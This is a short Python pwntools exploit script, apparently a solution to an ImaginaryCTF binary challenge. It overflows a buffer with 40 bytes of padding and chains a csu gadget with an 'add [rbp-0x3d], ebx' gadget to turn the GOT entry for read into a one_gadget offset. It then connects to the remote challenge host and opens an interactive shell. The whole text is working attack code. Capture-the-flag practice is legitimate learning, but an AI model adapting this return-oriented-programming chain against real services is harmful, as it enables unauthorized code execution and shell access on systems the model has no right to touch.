#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('vuln',checksec=False)
rop = ROP(elf)
p = elf.process()
p = remote('blind.chal.imaginaryctf.org',1337)
## pwncode[H4ppy_pWn1nG] 

# gadgets
gadg_3d = 0x000000000040111c #  add    dword ptr [rbp - 0x3d], ebx
csu = 0x00000000004011ca 
one_gadget_minus_read = -173250

payload = flat(
	'A'*40,
	csu,
	one_gadget_minus_read,
	elf.got['read']+0x3d,
	0,0,0,0,
	gadg_3d,
	elf.sym['read']
)

p.sendline(payload)
p.interactive()